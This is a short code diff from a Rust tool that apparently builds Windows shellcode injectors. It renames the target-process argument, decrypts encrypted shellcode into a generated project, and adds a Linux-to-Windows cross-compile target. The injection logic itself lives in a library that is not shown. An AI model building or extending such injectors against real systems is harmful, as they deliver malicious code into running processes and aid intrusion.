@@ -12,7 +12,7 @@ use std::fs;
 struct Args {
     /// Process to inject into
     #[arg(short, long)]
-    pid: String,
+    process: String,
 
     /// Path for x64 shellcode 
     #[arg(short, long)]
@@ -56,7 +56,7 @@ fn main() {
 
     let libraries = my_lib::libraries();
     let decrypt = my_lib::shellcode_decrypt(encrypted_shellcode.0, encrypted_shellcode.1, encrypted_shellcode.2);
-    let code = my_lib::payload_main(args.pid, args.dll, args.export);
+    let code = my_lib::payload_main(args.process, args.dll, args.export);
 
     file.write(libraries.as_bytes()).expect("Error writing to main.rs");
     if dll{
@@ -78,7 +78,11 @@ fn build_file(project_name: &str){
     let original_path = env::current_dir().unwrap();
     let project_path = original_path.join(project_name);
     env::set_current_dir(&project_path).expect("Failed to change directory to Rust project");
-    let args = vec!["build", "--release", "--quiet"];
+    let mut args = vec!["build", "--release", "--quiet"];
+    if cfg!(target_os = "linux"){
+        args.push("--target");
+        args.push("x86_64-pc-windows-gnu");
+    }
     Command::new("cargo")
         .args(&args)
         .status()
